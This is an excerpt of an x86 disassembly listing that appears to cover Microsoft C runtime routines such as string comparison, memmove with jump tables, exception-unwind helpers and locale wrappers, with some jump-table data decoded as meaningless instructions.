  4280d5:	cmp    cl,dl
  4280d7:	jne    0x4280db
  4280d9:	cmp    ch,dh
  4280db:	mov    eax,0x0
  4280e0:	sbb    eax,eax
  4280e2:	pop    edi
  4280e3:	sbb    eax,0xffffffff
  4280e6:	pop    esi
  4280e7:	ret    
  4280e8:	test   eax,eax
  4280ea:	je     0x4280b0
  4280ec:	mov    edx,DWORD PTR [esi]
  4280ee:	mov    ecx,DWORD PTR [edi]
  4280f0:	cmp    dl,cl
  4280f2:	jne    0x4280db
  4280f4:	sub    eax,0x1
  4280f7:	je     0x428115
  4280f9:	cmp    dh,ch
  4280fb:	jne    0x4280db
  4280fd:	sub    eax,0x1
  428100:	je     0x428115
  428102:	and    ecx,0xff0000
  428108:	and    edx,0xff0000
  42810e:	cmp    edx,ecx
  428110:	jne    0x4280db
  428112:	sub    eax,0x1
  428115:	pop    edi
  428116:	pop    esi
  428117:	ret    
  428118:	int3   
  428119:	int3   
  42811a:	int3   
  42811b:	int3   
  42811c:	int3   
  42811d:	int3   
  42811e:	int3   
  42811f:	int3   
  428120:	push   ebp
  428121:	mov    ebp,esp
  428123:	push   edi
  428124:	push   esi
  428125:	push   ebx
  428126:	mov    ecx,DWORD PTR [ebp+0x10]
  428129:	jecxz  0x428152
  42812b:	mov    ebx,ecx
  42812d:	mov    edi,DWORD PTR [ebp+0x8]
  428130:	mov    esi,edi
  428132:	xor    eax,eax
  428134:	repnz scas al,BYTE PTR es:[edi]
  428136:	neg    ecx
  428138:	add    ecx,ebx
  42813a:	mov    edi,esi
  42813c:	mov    esi,DWORD PTR [ebp+0xc]
  42813f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428141:	mov    al,BYTE PTR [esi-0x1]
  428144:	xor    ecx,ecx
  428146:	cmp    al,BYTE PTR [edi-0x1]
  428149:	ja     0x428150
  42814b:	je     0x428152
  42814d:	sub    ecx,0x2
  428150:	not    ecx
  428152:	mov    eax,ecx
  428154:	pop    ebx
  428155:	pop    esi
  428156:	pop    edi
  428157:	leave  
  428158:	ret    
  428159:	int3   
  42815a:	int3   
  42815b:	int3   
  42815c:	int3   
  42815d:	int3   
  42815e:	int3   
  42815f:	int3   
  428160:	push   ebp
  428161:	mov    ebp,esp
  428163:	push   esi
  428164:	xor    eax,eax
  428166:	push   eax
  428167:	push   eax
  428168:	push   eax
  428169:	push   eax
  42816a:	push   eax
  42816b:	push   eax
  42816c:	push   eax
  42816d:	push   eax
  42816e:	mov    edx,DWORD PTR [ebp+0xc]
  428171:	lea    ecx,[ecx+0x0]
  428174:	mov    al,BYTE PTR [edx]
  428176:	or     al,al
  428178:	je     0x428183
  42817a:	add    edx,0x1
  42817d:	bts    DWORD PTR [esp],eax
  428181:	jmp    0x428174
  428183:	mov    esi,DWORD PTR [ebp+0x8]
  428186:	mov    edi,edi
  428188:	mov    al,BYTE PTR [esi]
  42818a:	or     al,al
  42818c:	je     0x42819a
  42818e:	add    esi,0x1
  428191:	bt     DWORD PTR [esp],eax
  428195:	jae    0x428188
  428197:	lea    eax,[esi-0x1]
  42819a:	add    esp,0x20
  42819d:	pop    esi
  42819e:	leave  
  42819f:	ret    
  4281a0:	push   ebp
  4281a1:	mov    ebp,esp
  4281a3:	push   ebx
  4281a4:	push   esi
  4281a5:	push   edi
  4281a6:	push   ebp
  4281a7:	push   0x0
  4281a9:	push   0x0
  4281ab:	push   0x4281b8
  4281b0:	push   DWORD PTR [ebp+0x8]
  4281b3:	call   0x428c2e
  4281b8:	pop    ebp
  4281b9:	pop    edi
  4281ba:	pop    esi
  4281bb:	pop    ebx
  4281bc:	mov    esp,ebp
  4281be:	pop    ebp
  4281bf:	ret    
  4281c0:	mov    ecx,DWORD PTR [esp+0x4]
  4281c4:	test   DWORD PTR [ecx+0x4],0x6
  4281cb:	mov    eax,0x1
  4281d0:	je     0x4281e1
  4281d2:	mov    eax,DWORD PTR [esp+0x8]
  4281d6:	mov    edx,DWORD PTR [esp+0x10]
  4281da:	mov    DWORD PTR [edx],eax
  4281dc:	mov    eax,0x3
  4281e1:	ret    
  4281e2:	push   ebx
  4281e3:	push   esi
  4281e4:	push   edi
  4281e5:	mov    eax,DWORD PTR [esp+0x10]
  4281e9:	push   eax
  4281ea:	push   0xfffffffe
  4281ec:	push   0x4281c0
  4281f1:	push   DWORD PTR fs:0x0
  4281f8:	mov    DWORD PTR fs:0x0,esp
  4281ff:	mov    eax,DWORD PTR [esp+0x20]
  428203:	mov    ebx,DWORD PTR [eax+0x8]
  428206:	mov    esi,DWORD PTR [eax+0xc]
  428209:	cmp    esi,0xffffffff
  42820c:	je     0x42823c
  42820e:	cmp    esi,DWORD PTR [esp+0x24]
  428212:	je     0x42823c
  428214:	lea    esi,[esi+esi*2]
  428217:	mov    ecx,DWORD PTR [ebx+esi*4]
  42821a:	mov    DWORD PTR [esp+0x8],ecx
  42821e:	mov    DWORD PTR [eax+0xc],ecx
  428221:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428226:	jne    0x42823a
  428228:	push   0x101
  42822d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428231:	call   0x428276
  428236:	call   DWORD PTR [ebx+esi*4+0x8]
  42823a:	jmp    0x4281ff
  42823c:	pop    DWORD PTR fs:0x0
  428243:	add    esp,0xc
  428246:	pop    edi
  428247:	pop    esi
  428248:	pop    ebx
  428249:	ret    
  42824a:	xor    eax,eax
  42824c:	mov    ecx,DWORD PTR fs:0x0
  428253:	cmp    DWORD PTR [ecx+0x4],0x4281c0
  42825a:	jne    0x42826c
  42825c:	mov    edx,DWORD PTR [ecx+0xc]
  42825f:	mov    edx,DWORD PTR [edx+0xc]
  428262:	cmp    DWORD PTR [ecx+0x8],edx
  428265:	jne    0x42826c
  428267:	mov    eax,0x1
  42826c:	ret    
  42826d:	push   ebx
  42826e:	push   ecx
  42826f:	mov    ebx,0x45d94c
  428274:	jmp    0x428280
  428276:	push   ebx
  428277:	push   ecx
  428278:	mov    ebx,0x45d94c
  42827d:	mov    ecx,DWORD PTR [ebp+0x8]
  428280:	mov    DWORD PTR [ebx+0x8],ecx
  428283:	mov    DWORD PTR [ebx+0x4],eax
  428286:	mov    DWORD PTR [ebx+0xc],ebp
  428289:	pop    ecx
  42828a:	pop    ebx
  42828b:	ret    0x4
  42828e:	int3   
  42828f:	int3   
  428290:	push   ebp
  428291:	mov    ebp,esp
  428293:	push   edi
  428294:	push   esi
  428295:	mov    esi,DWORD PTR [ebp+0xc]
  428298:	mov    ecx,DWORD PTR [ebp+0x10]
  42829b:	mov    edi,DWORD PTR [ebp+0x8]
  42829e:	mov    eax,ecx
  4282a0:	mov    edx,ecx
  4282a2:	add    eax,esi
  4282a4:	cmp    edi,esi
  4282a6:	jbe    0x4282b0
  4282a8:	cmp    edi,eax
  4282aa:	jb     0x42842c
  4282b0:	test   edi,0x3
  4282b6:	jne    0x4282cc
  4282b8:	shr    ecx,0x2
  4282bb:	and    edx,0x3
  4282be:	cmp    ecx,0x8
  4282c1:	jb     0x4282ec
  4282c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282c5:	jmp    DWORD PTR [edx*4+0x4283dc]
  4282cc:	mov    eax,edi
  4282ce:	mov    edx,0x3
  4282d3:	sub    ecx,0x4
  4282d6:	jb     0x4282e4
  4282d8:	and    eax,0x3
  4282db:	add    ecx,eax
  4282dd:	jmp    DWORD PTR [eax*4+0x4282f0]
  4282e4:	jmp    DWORD PTR [ecx*4+0x4283ec]
  4282eb:	nop
  4282ec:	jmp    DWORD PTR [ecx*4+0x428370]
  4282f3:	nop
  4282f4:	add    BYTE PTR [ebx-0x7cd3ffbe],al
  4282fa:	inc    edx
  4282fb:	add    BYTE PTR [eax-0x7d],dl
  4282fe:	inc    edx
  4282ff:	add    BYTE PTR [ebx],ah
  428301:	ror    DWORD PTR [edx-0x75f877fa],1
  428307:	inc    esi
  428308:	add    DWORD PTR [eax+0x468a0147],ecx
  42830e:	add    al,cl
  428310:	jmp    0x28a0b17
  428315:	add    esi,0x3
  428318:	add    edi,0x3
  42831b:	cmp    ecx,0x8
  42831e:	jb     0x4282ec
  428320:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428322:	jmp    DWORD PTR [edx*4+0x4283dc]
  428329:	lea    ecx,[ecx+0x0]
  42832c:	and    edx,ecx
  42832e:	mov    al,BYTE PTR [esi]
  428330:	mov    BYTE PTR [edi],al
  428332:	mov    al,BYTE PTR [esi+0x1]
  428335:	shr    ecx,0x2
  428338:	mov    BYTE PTR [edi+0x1],al
  42833b:	add    esi,0x2
  42833e:	add    edi,0x2
  428341:	cmp    ecx,0x8
  428344:	jb     0x4282ec
  428346:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428348:	jmp    DWORD PTR [edx*4+0x4283dc]
  42834f:	nop
  428350:	and    edx,ecx
  428352:	mov    al,BYTE PTR [esi]
  428354:	mov    BYTE PTR [edi],al
  428356:	add    esi,0x1
  428359:	shr    ecx,0x2
  42835c:	add    edi,0x1
  42835f:	cmp    ecx,0x8
  428362:	jb     0x4282ec
  428364:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428366:	jmp    DWORD PTR [edx*4+0x4283dc]
  42836d:	lea    ecx,[ecx+0x0]
  428370:	rol    DWORD PTR [ebx-0x7c3fffbe],cl
  428376:	inc    edx
  428377:	add    BYTE PTR [eax-0x4fffbd7d],bh
  42837d:	add    DWORD PTR [edx+0x0],0xffffffa8
  428381:	add    DWORD PTR [edx+0x0],0xffffffa0
  428385:	add    DWORD PTR [edx+0x0],0xffffff98
  428389:	add    DWORD PTR [edx+0x0],0xffffff90
  42838d:	add    DWORD PTR [edx+0x0],0xffffff8b
  428391:	inc    esp
  428392:	mov    fs,esp
  428394:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  428398:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42839c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4283a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4283a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4283a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4283ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4283b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4283b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4283b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4283bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4283c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4283c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4283c8:	lea    eax,[ecx*4+0x0]
  4283cf:	add    esi,eax
  4283d1:	add    edi,eax
  4283d3:	jmp    DWORD PTR [edx*4+0x4283dc]
  4283da:	mov    edi,edi
  4283dc:	in     al,dx
  4283dd:	add    DWORD PTR [edx+0x0],0xfffffff4
  4283e1:	add    DWORD PTR [edx+0x0],0x0
  4283e5:	test   BYTE PTR [edx+0x0],al
  4283e8:	adc    al,0x84
  4283ea:	inc    edx
  4283eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4283f1:	leave  
  4283f2:	ret    
  4283f3:	nop
  4283f4:	mov    al,BYTE PTR [esi]
  4283f6:	mov    BYTE PTR [edi],al
  4283f8:	mov    eax,DWORD PTR [ebp+0x8]
  4283fb:	pop    esi
  4283fc:	pop    edi
  4283fd:	leave  
  4283fe:	ret    
  4283ff:	nop
  428400:	mov    al,BYTE PTR [esi]
  428402:	mov    BYTE PTR [edi],al
  428404:	mov    al,BYTE PTR [esi+0x1]
  428407:	mov    BYTE PTR [edi+0x1],al
  42840a:	mov    eax,DWORD PTR [ebp+0x8]
  42840d:	pop    esi
  42840e:	pop    edi
  42840f:	leave  
  428410:	ret    
  428411:	lea    ecx,[ecx+0x0]
  428414:	mov    al,BYTE PTR [esi]
  428416:	mov    BYTE PTR [edi],al
  428418:	mov    al,BYTE PTR [esi+0x1]
  42841b:	mov    BYTE PTR [edi+0x1],al
  42841e:	mov    al,BYTE PTR [esi+0x2]
  428421:	mov    BYTE PTR [edi+0x2],al
  428424:	mov    eax,DWORD PTR [ebp+0x8]
  428427:	pop    esi
  428428:	pop    edi
  428429:	leave  
  42842a:	ret    
  42842b:	nop
  42842c:	lea    esi,[ecx+esi*1-0x4]
  428430:	lea    edi,[ecx+edi*1-0x4]
  428434:	test   edi,0x3
  42843a:	jne    0x428460
  42843c:	shr    ecx,0x2
  42843f:	and    edx,0x3
  428442:	cmp    ecx,0x8
  428445:	jb     0x428454
  428447:	std    
  428448:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42844a:	cld    
  42844b:	jmp    DWORD PTR [edx*4+0x428578]
  428452:	mov    edi,edi
  428454:	neg    ecx
  428456:	jmp    DWORD PTR [ecx*4+0x428528]
  42845d:	lea    ecx,[ecx+0x0]
  428460:	mov    eax,edi
  428462:	mov    edx,0x3
  428467:	cmp    ecx,0x4
  42846a:	jb     0x428478
  42846c:	and    eax,0x3
  42846f:	sub    ecx,eax
  428471:	jmp    DWORD PTR [eax*4+0x42847c]
  428478:	jmp    DWORD PTR [ecx*4+0x428578]
  42847f:	nop
  428480:	mov    WORD PTR [edx+eax*2+0x4284b000],es
  428487:	add    al,bl
  428489:	test   BYTE PTR [edx+0x0],al
  42848c:	mov    al,BYTE PTR [esi+0x3]
  42848f:	and    edx,ecx
  428491:	mov    BYTE PTR [edi+0x3],al
  428494:	sub    esi,0x1
  428497:	shr    ecx,0x2
  42849a:	sub    edi,0x1
  42849d:	cmp    ecx,0x8
  4284a0:	jb     0x428454
  4284a2:	std    
  4284a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284a5:	cld    
  4284a6:	jmp    DWORD PTR [edx*4+0x428578]
  4284ad:	lea    ecx,[ecx+0x0]
  4284b0:	mov    al,BYTE PTR [esi+0x3]
  4284b3:	and    edx,ecx
  4284b5:	mov    BYTE PTR [edi+0x3],al
  4284b8:	mov    al,BYTE PTR [esi+0x2]
  4284bb:	shr    ecx,0x2
  4284be:	mov    BYTE PTR [edi+0x2],al
  4284c1:	sub    esi,0x2
  4284c4:	sub    edi,0x2
  4284c7:	cmp    ecx,0x8
  4284ca:	jb     0x428454
  4284cc:	std    
  4284cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284cf:	cld    
  4284d0:	jmp    DWORD PTR [edx*4+0x428578]
  4284d7:	nop
  4284d8:	mov    al,BYTE PTR [esi+0x3]
  4284db:	and    edx,ecx
  4284dd:	mov    BYTE PTR [edi+0x3],al
  4284e0:	mov    al,BYTE PTR [esi+0x2]
  4284e3:	mov    BYTE PTR [edi+0x2],al
  4284e6:	mov    al,BYTE PTR [esi+0x1]
  4284e9:	shr    ecx,0x2
  4284ec:	mov    BYTE PTR [edi+0x1],al
  4284ef:	sub    esi,0x3
  4284f2:	sub    edi,0x3
  4284f5:	cmp    ecx,0x8
  4284f8:	jb     0x428454
  4284fe:	std    
  4284ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428501:	cld    
  428502:	jmp    DWORD PTR [edx*4+0x428578]
  428509:	lea    ecx,[ecx+0x0]
  42850c:	sub    al,0x85
  42850e:	inc    edx
  42850f:	add    BYTE PTR [eax*4-0x7ac3ffbe],dh
  428516:	inc    edx
  428517:	add    BYTE PTR [ebp+eax*4+0x42],al
  42851b:	add    BYTE PTR [ebp+eax*4+0x42],cl
  42851f:	add    BYTE PTR [ebp+eax*4+0x42],dl
  428523:	add    BYTE PTR [ebp+eax*4+0x42],bl
  428527:	add    BYTE PTR [edi-0x7b],ch
  42852a:	inc    edx
  42852b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428531:	inc    esp
  428532:	(bad)  
  428533:	sbb    al,0x8b
  428535:	inc    esp
  428536:	mov    ds,WORD PTR [eax]
  428538:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42853c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428540:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428544:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428548:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42854c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428550:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428554:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428558:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42855c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428560:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428564:	lea    eax,[ecx*4+0x0]
  42856b:	add    esi,eax
  42856d:	add    edi,eax
  42856f:	jmp    DWORD PTR [edx*4+0x428578]
  428576:	mov    edi,edi
  428578:	mov    BYTE PTR [ebp-0x7a6fffbe],al
  42857e:	inc    edx
  42857f:	add    BYTE PTR [eax-0x4bffbd7b],ah
  428585:	test   DWORD PTR [edx+0x0],eax
  428588:	mov    eax,DWORD PTR [ebp+0x8]
  42858b:	pop    esi
  42858c:	pop    edi
  42858d:	leave  
  42858e:	ret    
  42858f:	nop
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	mov    BYTE PTR [edi+0x3],al
  428596:	mov    eax,DWORD PTR [ebp+0x8]
  428599:	pop    esi
  42859a:	pop    edi
  42859b:	leave  
  42859c:	ret    
  42859d:	lea    ecx,[ecx+0x0]
  4285a0:	mov    al,BYTE PTR [esi+0x3]
  4285a3:	mov    BYTE PTR [edi+0x3],al
  4285a6:	mov    al,BYTE PTR [esi+0x2]
  4285a9:	mov    BYTE PTR [edi+0x2],al
  4285ac:	mov    eax,DWORD PTR [ebp+0x8]
  4285af:	pop    esi
  4285b0:	pop    edi
  4285b1:	leave  
  4285b2:	ret    
  4285b3:	nop
  4285b4:	mov    al,BYTE PTR [esi+0x3]
  4285b7:	mov    BYTE PTR [edi+0x3],al
  4285ba:	mov    al,BYTE PTR [esi+0x2]
  4285bd:	mov    BYTE PTR [edi+0x2],al
  4285c0:	mov    al,BYTE PTR [esi+0x1]
  4285c3:	mov    BYTE PTR [edi+0x1],al
  4285c6:	mov    eax,DWORD PTR [ebp+0x8]
  4285c9:	pop    esi
  4285ca:	pop    edi
  4285cb:	leave  
  4285cc:	ret    
  4285cd:	push   ebp
  4285ce:	mov    ebp,esp
  4285d0:	sub    esp,0xc
  4285d3:	mov    eax,ds:0x45d430
  4285d8:	xor    eax,DWORD PTR [ebp+0x4]
  4285db:	and    BYTE PTR [ebp-0x6],0x0
  4285df:	push   0x6
  4285e1:	mov    DWORD PTR [ebp-0x4],eax
  4285e4:	lea    eax,[ebp-0xc]
  4285e7:	push   eax
  4285e8:	push   0x1004
  4285ed:	push   DWORD PTR [ebp+0x8]
  4285f0:	call   DWORD PTR ds:0x429100
  4285f6:	test   eax,eax
  4285f8:	jne    0x4285ff
  4285fa:	or     eax,0xffffffff
  4285fd:	jmp    0x428609
  4285ff:	lea    eax,[ebp-0xc]
  428602:	push   eax
  428603:	call   0x42890e
  428608:	pop    ecx
  428609:	mov    ecx,DWORD PTR [ebp-0x4]
  42860c:	xor    ecx,DWORD PTR [ebp+0x4]
  42860f:	call   0x425a1c
  428614:	leave  
  428615:	ret    
  428616:	push   0x38
  428618:	push   0x429fc0
  42861d:	call   0x425350
  428622:	mov    eax,ds:0x45d430
  428627:	xor    eax,DWORD PTR [ebp+0x4]
  42862a:	mov    DWORD PTR [ebp-0x1c],eax
  42862d:	xor    edi,edi
  42862f:	mov    DWORD PTR [ebp-0x20],edi
  428632:	mov    DWORD PTR [ebp-0x24],edi
  428635:	mov    eax,DWORD PTR [ebp+0x14]
  428638:	mov    ebx,DWORD PTR [eax]
  42863a:	mov    DWORD PTR [ebp-0x28],ebx
  42863d:	mov    DWORD PTR [ebp-0x2c],edi
  428640:	mov    eax,DWORD PTR [ebp+0x8]
  428643:	cmp    eax,DWORD PTR [ebp+0xc]
  428646:	je     0x4287bf
  42864c:	lea    ecx,[ebp-0x40]
  42864f:	push   ecx
  428650:	push   eax
  428651:	mov    esi,DWORD PTR ds:0x4290c8
  428657:	call   esi
  428659:	test   eax,eax
  42865b:	je     0x42867d
  42865d:	cmp    DWORD PTR [ebp-0x40],0x1
  428661:	jne    0x42867d
  428663:	lea    eax,[ebp-0x40]
  428666:	push   eax
  428667:	push   DWORD PTR [ebp+0xc]
  42866a:	call   esi
  42866c:	test   eax,eax
  42866e:	je     0x42867d
  428670:	cmp    DWORD PTR [ebp-0x40],0x1
  428674:	jne    0x42867d
  428676:	mov    DWORD PTR [ebp-0x2c],0x1
  42867d:	cmp    DWORD PTR [ebp-0x2c],edi
  428680:	je     0x42869c
  428682:	cmp    ebx,0xffffffff
  428685:	je     0x42868b
  428687:	mov    esi,ebx
  428689:	jmp    0x428697
  42868b:	push   DWORD PTR [ebp+0x10]
  42868e:	call   0x425960
  428693:	pop    ecx
  428694:	mov    esi,eax
  428696:	inc    esi
  428697:	mov    DWORD PTR [ebp-0x44],esi
  42869a:	jmp    0x42869f
  42869c:	mov    esi,DWORD PTR [ebp-0x44]
  42869f:	cmp    DWORD PTR [ebp-0x2c],edi
  4286a2:	jne    0x4286be
  4286a4:	push   edi
  4286a5:	push   edi
  4286a6:	push   ebx
  4286a7:	push   DWORD PTR [ebp+0x10]
  4286aa:	push   0x1
  4286ac:	push   DWORD PTR [ebp+0x8]
  4286af:	call   DWORD PTR ds:0x4290f0
  4286b5:	mov    esi,eax
  4286b7:	mov    DWORD PTR [ebp-0x44],esi
  4286ba:	cmp    esi,edi
  4286bc:	je     0x428716
  4286be:	mov    DWORD PTR [ebp-0x4],edi
  4286c1:	lea    eax,[esi+esi*1]
  4286c4:	add    eax,0x3
  4286c7:	and    eax,0xfffffffc
  4286ca:	call   0x4253a0
  4286cf:	mov    DWORD PTR [ebp-0x18],esp
  4286d2:	mov    ebx,esp
  4286d4:	mov    DWORD PTR [ebp-0x48],ebx
  4286d7:	lea    eax,[esi+esi*1]
  4286da:	push   eax
  4286db:	push   edi
  4286dc:	push   ebx
  4286dd:	call   0x427c50
  4286e2:	add    esp,0xc
  4286e5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286e9:	jmp    0x428702
  4286eb:	xor    eax,eax
  4286ed:	inc    eax
  4286ee:	ret    
  4286ef:	mov    esp,DWORD PTR [ebp-0x18]
  4286f2:	call   0x4287e5
  4286f7:	xor    edi,edi
  4286f9:	xor    ebx,ebx
  4286fb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286ff:	mov    esi,DWORD PTR [ebp-0x44]
  428702:	cmp    ebx,edi
  428704:	jne    0x428724
  428706:	push   esi
  428707:	push   0x2
  428709:	call   0x426468
  42870e:	pop    ecx
  42870f:	pop    ecx
  428710:	mov    ebx,eax
  428712:	cmp    ebx,edi
  428714:	jne    0x42871d
  428716:	xor    eax,eax
  428718:	jmp    0x4287d1
  42871d:	mov    DWORD PTR [ebp-0x24],0x1
  428724:	push   esi
  428725:	push   ebx
  428726:	push   DWORD PTR [ebp-0x28]
  428729:	push   DWORD PTR [ebp+0x10]
  42872c:	push   0x1
  42872e:	push   DWORD PTR [ebp+0x8]
  428731:	call   DWORD PTR ds:0x4290f0
  428737:	test   eax,eax
  428739:	je     0x4287c2
  42873f:	cmp    DWORD PTR [ebp+0x18],edi
  428742:	je     0x428764
  428744:	push   edi
  428745:	push   edi
  428746:	push   DWORD PTR [ebp+0x1c]
  428749:	push   DWORD PTR [ebp+0x18]
  42874c:	push   esi
  42874d:	push   ebx
  42874e:	push   edi
  42874f:	push   DWORD PTR [ebp+0xc]
  428752:	call   DWORD PTR ds:0x429080
  428758:	test   eax,eax
  42875a:	je     0x4287c2
  42875c:	mov    eax,DWORD PTR [ebp+0x18]
  42875f:	mov    DWORD PTR [ebp-0x20],eax
  428762:	jmp    0x4287c2
  428764:	cmp    DWORD PTR [ebp-0x2c],edi
  428767:	jne    0x42877f
  428769:	push   edi
  42876a:	push   edi
  42876b:	push   edi
  42876c:	push   edi
  42876d:	push   esi
  42876e:	push   ebx
  42876f:	push   edi
  428770:	push   DWORD PTR [ebp+0xc]
  428773:	call   DWORD PTR ds:0x429080
  428779:	mov    esi,eax
  42877b:	cmp    esi,edi
  42877d:	je     0x4287c2
  42877f:	push   esi
  428780:	push   0x1
  428782:	call   0x426468
  428787:	pop    ecx
  428788:	pop    ecx
  428789:	mov    DWORD PTR [ebp-0x20],eax
  42878c:	cmp    eax,edi
  42878e:	je     0x4287c2
  428790:	push   edi
  428791:	push   edi
  428792:	push   esi
  428793:	push   eax
  428794:	push   esi
  428795:	push   ebx
  428796:	push   edi
  428797:	push   DWORD PTR [ebp+0xc]
  42879a:	call   DWORD PTR ds:0x429080
  4287a0:	cmp    eax,edi
  4287a2:	jne    0x4287b2
  4287a4:	push   DWORD PTR [ebp-0x20]
  4287a7:	call   0x425f5a
  4287ac:	pop    ecx
  4287ad:	mov    DWORD PTR [ebp-0x20],edi
  4287b0:	jmp    0x4287c2
  4287b2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4287b6:	je     0x4287c2
  4287b8:	mov    ecx,DWORD PTR [ebp+0x14]
  4287bb:	mov    DWORD PTR [ecx],eax
  4287bd:	jmp    0x4287c2
  4287bf:	mov    ebx,DWORD PTR [ebp-0x48]
  4287c2:	cmp    DWORD PTR [ebp-0x24],edi
  4287c5:	je     0x4287ce
  4287c7:	push   ebx
  4287c8:	call   0x425f5a
  4287cd:	pop    ecx
  4287ce:	mov    eax,DWORD PTR [ebp-0x20]
  4287d1:	lea    esp,[ebp-0x54]
  4287d4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4287d7:	xor    ecx,DWORD PTR [ebp+0x4]
  4287da:	call   0x425a1c
  4287df:	call   0x42538b
  4287e4:	ret    
  4287e5:	push   ebp
  4287e6:	mov    ebp,esp
  4287e8:	sub    esp,0x48
  4287eb:	push   ebx
  4287ec:	push   esi
  4287ed:	push   edi
  4287ee:	push   0x4
  4287f0:	pop    eax
  4287f1:	call   0x4253a0
  4287f6:	mov    ebx,esp
  4287f8:	push   0x1c
  4287fa:	lea    eax,[ebp-0x24]
  4287fd:	push   eax
  4287fe:	push   ebx
  4287ff:	call   DWORD PTR ds:0x42910c
  428805:	test   eax,eax
  428807:	je     0x42887a
  428809:	mov    edi,DWORD PTR [ebp-0x20]
  42880c:	lea    eax,[ebp-0x48]
  42880f:	push   eax
  428810:	call   DWORD PTR ds:0x42904c
  428816:	mov    eax,DWORD PTR [ebp-0x44]
  428819:	lea    esi,[eax-0x1]
  42881c:	not    esi
  42881e:	and    esi,ebx
  428820:	sub    esi,eax
  428822:	mov    DWORD PTR [ebp-0x4],eax
  428825:	mov    eax,ds:0x45dac4
  42882a:	mov    ecx,eax
  42882c:	dec    ecx
  42882d:	neg    ecx
  42882f:	sbb    ecx,ecx
  428831:	and    ecx,0xffff1000
  428837:	add    ecx,0x11000
  42883d:	add    ecx,edi
  42883f:	cmp    esi,ecx
  428841:	jb     0x42887a
  428843:	cmp    eax,0x1
  428846:	je     0x428892
  428848:	mov    ebx,edi
  42884a:	mov    edi,0x1000
  42884f:	push   0x1c
  428851:	lea    eax,[ebp-0x24]
  428854:	push   eax
  428855:	push   ebx
  428856:	call   DWORD PTR ds:0x42910c
  42885c:	test   eax,eax
  42885e:	je     0x42887a
  428860:	add    ebx,DWORD PTR [ebp-0x18]
  428863:	test   DWORD PTR [ebp-0x14],edi
  428866:	je     0x42884f
  428868:	test   BYTE PTR [ebp-0xf],0x1
  42886c:	mov    ebx,DWORD PTR [ebp-0x24]
  42886f:	je     0x428876
  428871:	xor    eax,eax
  428873:	inc    eax
  428874:	jmp    0x4288ae
  428876:	cmp    esi,ebx
  428878:	jae    0x42887e
  42887a:	xor    eax,eax
  42887c:	jmp    0x4288ae
  42887e:	push   0x4
  428880:	push   edi
  428881:	push   DWORD PTR [ebp-0x4]
  428884:	push   ebx
  428885:	call   DWORD PTR ds:0x4290d0
  42888b:	mov    eax,ds:0x45dac4
  428890:	jmp    0x428894
  428892:	mov    ebx,esi
  428894:	dec    eax
  428895:	neg    eax
  428897:	sbb    eax,eax
  428899:	and    eax,0x103
  42889e:	lea    ecx,[ebp-0x8]
  4288a1:	push   ecx
  4288a2:	inc    eax
  4288a3:	push   eax
  4288a4:	push   DWORD PTR [ebp-0x4]
  4288a7:	push   ebx
  4288a8:	call   DWORD PTR ds:0x429108
  4288ae:	lea    esp,[ebp-0x54]
  4288b1:	pop    edi
  4288b2:	pop    esi
  4288b3:	pop    ebx
  4288b4:	leave  
  4288b5:	ret    
  4288b6:	int3   
  4288b7:	int3   
  4288b8:	int3   
  4288b9:	int3   
  4288ba:	int3   
  4288bb:	int3   
  4288bc:	int3   
  4288bd:	int3   
  4288be:	int3   
  4288bf:	int3   
  4288c0:	push   ebp
  4288c1:	mov    ebp,esp
  4288c3:	push   edi
  4288c4:	push   esi
  4288c5:	push   ebx
  4288c6:	mov    esi,DWORD PTR [ebp+0xc]
  4288c9:	mov    edi,DWORD PTR [ebp+0x8]
  4288cc:	mov    al,0xff
  4288ce:	mov    edi,edi
  4288d0:	or     al,al
  4288d2:	je     0x428906
  4288d4:	mov    al,BYTE PTR [esi]
  4288d6:	add    esi,0x1
  4288d9:	mov    ah,BYTE PTR [edi]
  4288db:	add    edi,0x1
  4288de:	cmp    ah,al
  4288e0:	je     0x4288d0
  4288e2:	sub    al,0x41
  4288e4:	cmp    al,0x1a
  4288e6:	sbb    cl,cl
  4288e8:	and    cl,0x20
  4288eb:	add    al,cl
  4288ed:	add    al,0x41
  4288ef:	xchg   al,ah
  4288f1:	sub    al,0x41
